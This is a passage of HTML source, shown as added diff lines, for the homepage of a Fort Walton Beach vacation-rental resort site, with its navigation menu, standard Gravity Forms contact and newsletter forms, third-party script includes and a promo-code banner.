+var jsLangVars = {"currentLanguage":null,"defaultLanguage":null,"drpAlertMsg":"Select a blue date for","drpCheckIn":"check in","drpCheckOut":"check out","drpBtnText":"Clear","calTipsCheckIn":"Checkin Available","calTipsCheckOut":"Checkout Available","calTipsNa":"Not Available","ratingSg":"review","ratingPl":"reviews"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/assets/dist/js/resortpro.min.js?ver=6.8.2" id="resortpro-js"></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-multiselect/0.9.15/js/bootstrap-multiselect.js?ver=6.8.2" id="multiselect-js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/jquery.sticky.min.js?ver=6.8.2" id="jquery-sticky-js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/assets/dist/js/custom_quote.min.js?ver=6.8.2" id="custom-quote-js-js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/momentjs/latest/moment-with-locales.min.js?ver=6.8.2" id="moment-js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/assets/src/js/daterangepicker.js?ver=6.8.2" id="daterange-picker-js"></script>
+<link rel="https://api.w.org/" href="https://www.breakersfwb.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.breakersfwb.com/wp-json/wp/v2/pages/66" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.breakersfwb.com/xmlrpc.php?rsd" />
+<link rel='shortlink' href='https://www.breakersfwb.com/' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://www.breakersfwb.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.breakersfwb.com%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://www.breakersfwb.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.breakersfwb.com%2F&#038;format=xml" />
+<!-- Stream WordPress user activity plugin v4.1.1 -->
+<meta plugin_version="og:version" content="3.0.7" />
+<link rel="icon" href="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/04/cropped-breakers-fwb-favicon-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/04/cropped-breakers-fwb-favicon-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://breakersfwb.wpenginepowered.com/wp-content/uploads/2023/04/cropped-breakers-fwb-favicon-180x180.png" />
+<meta name="msapplication-TileImage" content="https://www.breakersfwb.com/wp-content/uploads/2023/04/cropped-breakers-fwb-favicon-270x270.png" />
+		<style type="text/css" id="wp-custom-css">
+			
+		</style>
+		
+	<script>(function(){var s = document.createElement('script'),e = ! document.body ? document.querySelector('head') : document.body;s.src = 'https://acsbap.com/apps/app/assets/js/acsb.js';s.async = s.defer = true;s.onload = function(){acsbJS.init({statementLink : '',feedbackLink : '',footerHtml : '',hideMobile : false,hideTrigger : false,language : 'en',position : 'right',leadColor : '#008081',triggerColor : '#008081',triggerRadius : '50%',triggerPositionX : 'right',triggerPositionY : 'bottom',triggerIcon : 'default',triggerSize : 'big',triggerOffsetX : 20,triggerOffsetY : 50,mobile : {triggerSize : 'small',triggerPositionX : 'right',triggerPositionY : 'center',triggerOffsetX : 0,triggerOffsetY : 0,triggerRadius : '50%'}});};e.appendChild(s);}());</script>
+	
+	
+	</head>
+<body class="home wp-singular page-template page-template-templates page-template-activities-new page-template-templatesactivities-new-php page page-id-66 wp-theme-bizcor2018 slash_logic">
+    <header>
+        <div class="fixing">
+			<!--<div class="warningMessage">
+                <article>
+                    <p>Beginning January 1, 2019 We Are Completely Non-Smoking Including Vaping and E-Cigarettes</p>
+                    <span class="closen">x</span>
+                </article>
+            </div>-->
+            <div class="container-fluid">
+                <div class="mobile-fixed-bar">
+                    <div class="custom-links pull-right clearfix">                  
+                        <ul>
+                            <li><a href="#" data-toggle="modal" data-target="#headerSearchModal" class="flyout-form-btn"><i class="fa fa-search" aria-hidden="true"></i></a></li>
+                            <li><a href="tel:8003954853"><i class="fa fa-phone" aria-hidden="true"></i></a></li>
+                            <li><a class="email"  href="#"><i class="fa fa-envelope" aria-hidden="true"></i></a></li>
+                            <li><a href="/favorites/"><i class="fa fa-heart" aria-hidden="true"></i></a></li>              
+                        </ul>
+                    </div>
+                </div>            
+                <div class="logo floatLeft">
+                    <a href="/">
+                        <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/logo.png" title="Logo for The Breakers of Fort Walton Beach - Fort Walton Beach Vacation Rentals" alt="Fort Walton Beach Rentals at The Breakers of Fort Walton Beach - Logo"/>
+                    </a>                    
+                </div>
+                <div class="chat-box">
+                    <div class="box">
+                        <a href="/favorites/">
+                            <i class="fa fa-heart" aria-hidden="true"></i>
+                            <p>My Favs</p>
+                        </a>
+                    </div>
+                    <div class="box">
+                        <a class="email" href="#">
+                            <i class="fa fa-envelope" aria-hidden="true"></i>
+                            <p>email</p>
+                        </a>
+                    </div>
+                </div>
+                <div class="box-custom">
+                    <ul class="custom-links pull-right">
+                        <li><a href="#" data-toggle="modal" data-target="#headerSearchModal" class="flyout-form-btn"><i class="fa fa-search" aria-hidden="true"></i></a></li>
+                        <li><a href="tel:8003954853" class="tel"><!-- <i class="fa fa-phone" aria-hidden="true"></i> --> (800) 395-GULF</a></li>
+                    </ul> 
+                    <nav class="pull-right" >                   
+                        <div class="menu-header-menu-container"><ul><li id="menu-item-13" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-13"><a href="/fort-walton-beach-resort-rentals/">Rental Information</a>
+<ul class="sub-menu">
+	<li id="menu-item-43454" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43454"><a href="https://www.breakersfwb.com/fort-walton-beach-resort-rentals/">Search All Rentals</a></li>
+	<li id="menu-item-46884" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-46884"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/">Search Rentals by Bedroom</a>
+	<ul class="sub-menu">
+		<li id="menu-item-46888" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-46888"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/one-bedroom/?sort_by=random">One Bedroom Condos</a></li>
+		<li id="menu-item-46889" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-46889"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/two-bedroom/?sort_by=random">Two Bedroom Condos</a></li>
+		<li id="menu-item-46890" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-46890"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/three-bedroom/?sort_by=random">Three Bedroom Condos</a></li>
+		<li id="menu-item-46885" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-46885"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/2-bed-2-bath-deluxe-rentals/?sort_by=random">Two Bedroom, Two Bathroom Condos</a></li>
+		<li id="menu-item-46886" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-46886"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/3-bed-2-bath-rentals/?sort_by=random">Three Bedroom, Two Bathroom Condos</a></li>
+		<li id="menu-item-46887" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-46887"><a target="_blank" href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/rentals-by-bedroom/3-bath-3-bedroom-condos-in-fort-walton-beach/?sort_by=random">Three Bedroom, Three Bathroom Condos</a></li>
+	</ul>
+</li>
+	<li id="menu-item-47403" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47403"><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/search-by-amenity/">Search by Amenity</a></li>
+	<li id="menu-item-47122" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47122"><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/spring-rentals-in-fort-walton-beach/">Spring Rentals</a></li>
+	<li id="menu-item-47354" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47354"><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/last-minute-rentals-in-fort-walton-beach/">Last-Minute Rentals</a></li>
+	<li id="menu-item-46721" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46721"><a href="https://www.breakersfwb.com/specials/">Specials</a></li>
+	<li id="menu-item-46435" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46435"><a href="https://www.breakersfwb.com/rate-sheet/">Rate Sheet</a></li>
+	<li id="menu-item-44085" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44085"><a href="https://www.breakersfwb.com/our-fort-walton-beach-resort-rentals/floor-plans/">Floor Plans</a></li>
+	<li id="menu-item-46991" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46991"><a href="https://www.breakersfwb.com/payment-login/">Make a payment</a></li>
+</ul>
+</li>
+<li id="menu-item-43437" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-43437"><a href="https://www.breakersfwb.com/experience/">Experience Fort Walton</a>
+<ul class="sub-menu">
+	<li id="menu-item-43607" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-43607"><a href="/experience/amenities/">Amenities</a></li>
+	<li id="menu-item-43996" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43996"><a href="https://www.breakersfwb.com/activities/">Activities</a></li>
+	<li id="menu-item-43995" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43995"><a href="https://www.breakersfwb.com/fort-walton-beach-attractions/">Attractions</a></li>
+	<li id="menu-item-57" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-57"><a href="https://www.breakersfwb.com/island-blog/">Blog</a></li>
+	<li id="menu-item-45571" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-45571"><a href="/xplorieactivites/">Complementary Activities</a></li>
+	<li id="menu-item-60" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-60"><a href="https://www.breakersfwb.com/experience/dining/">Dining</a></li>
+	<li id="menu-item-46627" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46627"><a href="https://www.breakersfwb.com/enchanting-picnic/">Enchanting Picnic</a></li>
+	<li id="menu-item-62" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-62"><a href="https://www.breakersfwb.com/experience/spa-and-golf/">Golf</a></li>
+	<li id="menu-item-44590" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44590"><a href="https://www.breakersfwb.com/holidays-in-fort-walton-beach/">Holidays</a></li>
+	<li id="menu-item-44335" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44335"><a href="https://www.breakersfwb.com/journey-to-fort-walton-beach/">Journeys</a></li>
+	<li id="menu-item-46080" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46080"><a href="https://www.breakersfwb.com/fort-walton-beach-top-5-articles/">Top 5</a></li>
+	<li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-61"><a href="https://www.breakersfwb.com/why-choose-the-breakers-for-fort-walton-weddings/wedding/">Weddings</a></li>
+</ul>
+</li>
+<li id="menu-item-15" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-15"><a>Venue</a>
+<ul class="sub-menu">
+	<li id="menu-item-43477" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43477"><a href="https://www.breakersfwb.com/host-your-event/">Venue Information</a></li>
+</ul>
+</li>
+<li id="menu-item-328" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-328"><a href="https://www.breakersfwb.com/about-us/">About</a>
+<ul class="sub-menu">
+	<li id="menu-item-44152" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-44152"><a target="_blank" href="https://breakersfwb.rentalguardian.com/">Travel Insurance</a></li>
+	<li id="menu-item-43493" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43493"><a href="https://www.breakersfwb.com/contact-us/">Contact Us</a></li>
+	<li id="menu-item-43485" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43485"><a href="https://www.breakersfwb.com/frequently-asked-questions-the-breakers/">FAQ</a></li>
+	<li id="menu-item-43484" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43484"><a href="https://www.breakersfwb.com/about-us/our-photos/">Our Photos</a></li>
+	<li id="menu-item-43486" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43486"><a href="https://www.breakersfwb.com/about-us/reviews/">Reviews</a></li>
+</ul>
+</li>
+</ul></div>       
+                    </nav>
+                </div>
+                <div class="mobileMenu">
+                    <span class="iconAnime">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </span>
+                </div>                           
+            </div><!--End container-fluid-->
+            <div class="CustomMobileMenu">
+                <div class="counter">
+                    <p class="topM">
+                        <a href="https://www.breakersfwb.com/">
+                            <img src="https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/images/logo-blue.png" alt="logo"/>
+                        </a>
+                        <span class="mobileMenuClose">
+                             <i class="fa fa-times" aria-hidden="true"></i>
+                        </span>
+                    </p>
+                    <script type="text/javascript"></script>
+                <div class='gf_browser_chrome gform_wrapper gform_legacy_markup_wrapper gform-theme--no-framework' data-form-theme='legacy' data-form-index='0' id='gform_wrapper_3' ><div id='gf_3' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_3' id='gform_3'  action='/#gf_3' data-formid='3' novalidate>
+                        <div class='gform-body gform_body'><ul id='gform_fields_3' class='gform_fields top_label form_sublabel_below description_below validation_below'><li id="field_3_1" class="gfield gfield--type-name gfield_contains_required field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_1" ><label class='gfield_label gform-field-label screen-reader-text gfield_label_before_complex' ><span class="gfield_required"><span class="gfield_required gfield_required_asterisk">*</span></span></label><div class='ginput_complex ginput_container ginput_container--name no_prefix has_first_name no_middle_name no_last_name no_suffix gf_name_has_1 ginput_container_name gform-grid-row' id='input_3_1'>
+                            
+                            <span id='input_3_1_3_container' class='name_first gform-grid-col gform-grid-col--size-auto' >
+                                                    <input type='text' name='input_1.3' id='input_3_1_3' value='' tabindex='20'  aria-required='true'   placeholder='Name*'  />
+                                                    <label for='input_3_1_3' class='gform-field-label gform-field-label--type-sub '>First</label>
+                                                </span>
+                            
+                            
+                            
+                        </div></li><li id="field_3_2" class="gfield gfield--type-email gfield_contains_required field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_2" ><label class='gfield_label gform-field-label screen-reader-text' for='input_3_2'>Email*<span class="gfield_required"><span class="gfield_required gfield_required_asterisk">*</span></span></label><div class='ginput_container ginput_container_email'>
+                            <input name='input_2' id='input_3_2' type='email' value='' class='medium' tabindex='24'  placeholder='Email*' aria-required="true" aria-invalid="false"  />
+                        </div></li><li id="field_3_3" class="gfield gfield--type-phone field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_3" ><label class='gfield_label gform-field-label screen-reader-text' for='input_3_3'>Phone</label><div class='ginput_container ginput_container_phone'><input name='input_3' id='input_3_3' type='tel' value='' class='medium' tabindex='25' placeholder='Phone'  aria-invalid="false"   /></div></li><li id="field_3_4" class="gfield gfield--type-textarea field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_4" ><label class='gfield_label gform-field-label screen-reader-text' for='input_3_4'>What would you like to know more about?</label><div class='ginput_container ginput_container_textarea'><textarea name='input_4' id='input_3_4' class='textarea medium' tabindex='26'   placeholder='What would you like to know more about?'  aria-invalid="false"   rows='10' cols='50'></textarea></div></li><li id="field_3_5" class="gfield gfield--type-hidden gform_hidden field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_5" ><div class='ginput_container ginput_container_text'><input name='input_5' id='input_3_5' type='hidden' class='gform_hidden'  aria-invalid="false" value='https://www.breakersfwb.com/ | Home Of Fort Walton Beach Resorts' /></div></li><li id="field_3_6" class="gfield gfield--type-captcha field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_6" ><label class='gfield_label gform-field-label' for='input_3_6'>CAPTCHA</label><div id='input_3_6' class='ginput_container ginput_recaptcha' data-sitekey='6LcPs0EaAAAAAFUQ7BFNaWHXzMja53Hsbzf2ucDU'  data-theme='light' data-tabindex='27'  data-badge=''></div></li><li id="field_3_7" class="gfield gfield--type-honeypot gform_validation_container field_sublabel_below gfield--has-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_3_7" ><label class='gfield_label gform-field-label' for='input_3_7'>Phone</label><div class='ginput_container'><input name='input_7' id='input_3_7' type='text' value='' autocomplete='new-password'/></div><div class='gfield_description' id='gfield_description_3_7'>This field is for validation purposes and should be left unchanged.</div></li></ul></div>
+        <div class='gform-footer gform_footer top_label'> <input type='submit' id='gform_submit_button_3' class='gform_button button' onclick='gform.submission.handleButtonClick(this);' value='Send' tabindex='28' /> <input type='hidden' name='gform_ajax' value='form_id=3&amp;title=&amp;description=&amp;tabindex=19&amp;theme=legacy&amp;styles=[]&amp;hash=cf5a19584cea325e1cce03cb0e986c96' />
+            <input type='hidden' class='gform_hidden' name='gform_submission_method' data-js='gform_submission_method_3' value='iframe' />
+            <input type='hidden' class='gform_hidden' name='gform_theme' data-js='gform_theme_3' id='gform_theme_3' value='legacy' />
+            <input type='hidden' class='gform_hidden' name='gform_style_settings' data-js='gform_style_settings_3' id='gform_style_settings_3' value='[]' />
+            <input type='hidden' class='gform_hidden' name='is_submit_3' value='1' />
+            <input type='hidden' class='gform_hidden' name='gform_submit' value='3' />
+            
+            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
+            <input type='hidden' class='gform_hidden' name='state_3' value='WyJbXSIsIjg5MjVlZDQ3OWQzODk0NDhlMjYxZTY5ODQ1OGQ1MDkwIl0=' />
+            <input type='hidden' autocomplete='off' class='gform_hidden' name='gform_target_page_number_3' id='gform_target_page_number_3' value='0' />
+            <input type='hidden' autocomplete='off' class='gform_hidden' name='gform_source_page_number_3' id='gform_source_page_number_3' value='1' />
+            <input type='hidden' name='gform_field_values' value='' />
+            
+        </div>
+                        </form>
+                        </div>
+		                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_3' id='gform_ajax_frame_3' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
+		                <script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() {gformInitSpinner( 3, 'https://www.breakersfwb.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery('#gform_ajax_frame_3').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_3');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_3').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_3').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_3').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_3').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_3').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_3').val();gformInitSpinner( 3, 'https://www.breakersfwb.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery(document).trigger('gform_page_loaded', [3, current_page]);window['gf_submitting_3'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}jQuery('#gform_wrapper_3').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_3').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [3]);window['gf_submitting_3'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_3').text());}else{jQuery('#gform_3').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger("gform_pre_post_render", [{ formId: "3", currentPage: "current_page", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_3" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_3";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_3" );        let postRenderFired = false;                function triggerPostRender() {            if ( postRenderFired ) {                return;            }            postRenderFired = true;            jQuery( document ).trigger( 'gform_post_render', [3, current_page] );            gform.utils.trigger( { event: 'gform/postRender', native: false, data: { formId: 3, currentPage: current_page } } );            gform.utils.trigger( { event: 'gform/post_render', native: false, data: { formId: 3, currentPage: current_page } } );            if ( visibilityTestDiv ) {                visibilityTestDiv.parentNode.removeChild( visibilityTestDiv );            }        }        function debounce( func, wait, immediate ) {            var timeout;            return function() {                var context = this, args = arguments;                var later = function() {                    timeout = null;                    if ( !immediate ) func.apply( context, args );                };                var callNow = immediate && !timeout;                clearTimeout( timeout );                timeout = setTimeout( later, wait );                if ( callNow ) func.apply( context, args );            };        }        const debouncedTriggerPostRender = debounce( function() {            triggerPostRender();        }, 200 );        if ( visibilityTestDiv && visibilityTestDiv.offsetParent === null ) {            const observer = new MutationObserver( ( mutations ) => {                mutations.forEach( ( mutation ) => {                    if ( mutation.type === 'attributes' && visibilityTestDiv.offsetParent !== null ) {                        debouncedTriggerPostRender();                        observer.disconnect();                    }                });            });            observer.observe( document.body, {                attributes: true,                childList: false,                subtree: true,                attributeFilter: [ 'style', 'class' ],            });        } else {            triggerPostRender();        }    } );} ); 
+/* ]]> */
+</script>
+                
+                </div>
+            </div><!--End CustomMobileMenu -->  
+        </div><!--End fixing-->
+    </header>
+	
+	<span style="display:none;">
+Current PHP version: 7.4.33.11</span>
+	
+	<style>
+            .pop_up_wrapp{
+                display: none;
+            }
+        </style><style>
+            .home .pop_up_wrapp{
+                display: block;
+            }
+        </style><div class="pop_up_wrapp">SLIDE<br>Use promo code SLIDE at checkout for 15% off!<br>** For stays in September. Cannot be combined with any other discounts/offers/promotions. Not valid for existing reservations. **<br> <a href="/specials/"> More information here</a></div>
+            <style>
+                .pop_up_wrapp{
+                    width: 100%;
+                    padding: 10px 10px;
+                    text-align: center;
+                    background: #8fbfb2;
+                    color:  #ffffff;
+                    font-size: 22px;
+					position: relative;
+                    top: 0px;
+                    z-index: 10000;					
+                }
+                .pop_up_wrapp a{
+                    color:  #ffffff;
+                    text-decoration: underline;
+                }
+            </style>
+            
+                <style>
+                    .pop_up_wrapp{
+                        top: 80px;
+                    }
+                    @media only screen and (max-width: 1199px){
+                       .pop_up_wrapp{
+                            position: static;
+                       }
+                    }
+                </style>
+            	<!-- <div class="warningMessage">
+                <article>
+					<p>Beginning January 1, 2019 We Are Completely Non-Smoking Including Vaping and E-Cigarettes</p>
+                </article>
+	</div> -->
+<style>
+ .warningMessage {
+	background:#c60101;
+	 text-align:center;
+	 font-size:16px;
+	 color:#ffffff;
+	 padding-top:10px;
+	 padding-bottom:10px;
+}	
+	.closen {
+		float:right;
+		text-align:right;
+	}
+</style><div class="content">
+
+<div class="card-newsletter" id ="card-newsletter">
+   <button class="closeButton" onclick="myFunction()">&times;</button>
+     <div class="text-newsletter">
+        <div class="title-newsletter">
+          Subscribe to our emails?
+        </div>
+        <div class="info-newsletter">
+          Enter your email to stay up to date with all of our latest offers and get any news/updates about our property and what is currently trending.
+        </div>
+     </div>
+     <div class="buttons-newsletter">
+	
+                <div class='gf_browser_chrome gform_wrapper gravity-theme gform-theme--no-framework' data-form-theme='gravity-theme' data-form-index='0' id='gform_wrapper_16' ><div id='gf_16' class='gform_anchor' tabindex='-1'></div><form method='post' enctype='multipart/form-data' target='gform_ajax_frame_16' id='gform_16'  action='/#gf_16' data-formid='16' novalidate>
+                        <div class='gform-body gform_body'><div id='gform_fields_16' class='gform_fields top_label form_sublabel_below description_below validation_below'><div id="field_16_1" class="gfield gfield--type-email gfield_contains_required field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_16_1" ><label class='gfield_label gform-field-label' for='input_16_1'>Email<span class="gfield_required"><span class="gfield_required gfield_required_text">(Required)</span></span></label><div class='ginput_container ginput_container_email'>
+                            <input name='input_1' id='input_16_1' type='email' value='' class='large' tabindex='49'  placeholder='Email Address*' aria-required="true" aria-invalid="false"  />
+                        </div></div><div id="field_16_3" class="gfield gfield--type-hidden gfield--width-full gform_hidden field_sublabel_below gfield--no-description field_description_below field_validation_below gfield_visibility_visible"  data-js-reload="field_16_3" ><div class='ginput_container ginput_container_text'><input name='input_3' id='input_16_3' type='hidden' class='gform_hidden'  aria-invalid="false" value='https://www.breakersfwb.com/Home Of Fort Walton Beach Resorts' /></div></div></div></div>
+        <div class='gform-footer gform_footer top_label'> <input type='submit' id='gform_submit_button_16' class='gform_button button' onclick='gform.submission.handleButtonClick(this);' value='Subscribe' tabindex='50' /> <input type='hidden' name='gform_ajax' value='form_id=16&amp;title=&amp;description=&amp;tabindex=49&amp;theme=gravity-theme&amp;styles=[]&amp;hash=4f2137041d4091445df6a969b9de1c17' />
+            <input type='hidden' class='gform_hidden' name='gform_submission_method' data-js='gform_submission_method_16' value='iframe' />
+            <input type='hidden' class='gform_hidden' name='gform_theme' data-js='gform_theme_16' id='gform_theme_16' value='gravity-theme' />
+            <input type='hidden' class='gform_hidden' name='gform_style_settings' data-js='gform_style_settings_16' id='gform_style_settings_16' value='[]' />
+            <input type='hidden' class='gform_hidden' name='is_submit_16' value='1' />
+            <input type='hidden' class='gform_hidden' name='gform_submit' value='16' />
+            
+            <input type='hidden' class='gform_hidden' name='gform_unique_id' value='' />
+            <input type='hidden' class='gform_hidden' name='state_16' value='WyJbXSIsIjg5MjVlZDQ3OWQzODk0NDhlMjYxZTY5ODQ1OGQ1MDkwIl0=' />
+            <input type='hidden' autocomplete='off' class='gform_hidden' name='gform_target_page_number_16' id='gform_target_page_number_16' value='0' />
+            <input type='hidden' autocomplete='off' class='gform_hidden' name='gform_source_page_number_16' id='gform_source_page_number_16' value='1' />
+            <input type='hidden' name='gform_field_values' value='' />
+            
+        </div>
+                        </form>
+                        </div>
+		                <iframe style='display:none;width:0px;height:0px;' src='about:blank' name='gform_ajax_frame_16' id='gform_ajax_frame_16' title='This iframe contains the logic required to handle Ajax powered Gravity Forms.'></iframe>
+		                <script type="text/javascript">
+/* <![CDATA[ */
+ gform.initializeOnLoaded( function() {gformInitSpinner( 16, 'https://www.breakersfwb.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery('#gform_ajax_frame_16').on('load',function(){var contents = jQuery(this).contents().find('*').html();var is_postback = contents.indexOf('GF_AJAX_POSTBACK') >= 0;if(!is_postback){return;}var form_content = jQuery(this).contents().find('#gform_wrapper_16');var is_confirmation = jQuery(this).contents().find('#gform_confirmation_wrapper_16').length > 0;var is_redirect = contents.indexOf('gformRedirect(){') >= 0;var is_form = form_content.length > 0 && ! is_redirect && ! is_confirmation;var mt = parseInt(jQuery('html').css('margin-top'), 10) + parseInt(jQuery('body').css('margin-top'), 10) + 100;if(is_form){jQuery('#gform_wrapper_16').html(form_content.html());if(form_content.hasClass('gform_validation_error')){jQuery('#gform_wrapper_16').addClass('gform_validation_error');} else {jQuery('#gform_wrapper_16').removeClass('gform_validation_error');}setTimeout( function() { /* delay the scroll by 50 milliseconds to fix a bug in chrome */ jQuery(document).scrollTop(jQuery('#gform_wrapper_16').offset().top - mt); }, 50 );if(window['gformInitDatepicker']) {gformInitDatepicker();}if(window['gformInitPriceFields']) {gformInitPriceFields();}var current_page = jQuery('#gform_source_page_number_16').val();gformInitSpinner( 16, 'https://www.breakersfwb.com/wp-content/plugins/gravityforms/images/spinner.svg', true );jQuery(document).trigger('gform_page_loaded', [16, current_page]);window['gf_submitting_16'] = false;}else if(!is_redirect){var confirmation_content = jQuery(this).contents().find('.GF_AJAX_POSTBACK').html();if(!confirmation_content){confirmation_content = contents;}jQuery('#gform_wrapper_16').replaceWith(confirmation_content);jQuery(document).scrollTop(jQuery('#gf_16').offset().top - mt);jQuery(document).trigger('gform_confirmation_loaded', [16]);window['gf_submitting_16'] = false;wp.a11y.speak(jQuery('#gform_confirmation_message_16').text());}else{jQuery('#gform_16').append(contents);if(window['gformRedirect']) {gformRedirect();}}jQuery(document).trigger("gform_pre_post_render", [{ formId: "16", currentPage: "current_page", abort: function() { this.preventDefault(); } }]);                if (event && event.defaultPrevented) {                return;         }        const gformWrapperDiv = document.getElementById( "gform_wrapper_16" );        if ( gformWrapperDiv ) {            const visibilitySpan = document.createElement( "span" );            visibilitySpan.id = "gform_visibility_test_16";            gformWrapperDiv.insertAdjacentElement( "afterend", visibilitySpan );        }        const visibilityTestDiv = document.getElementById( "gform_visibility_test_16" );        let postRenderFired = false;                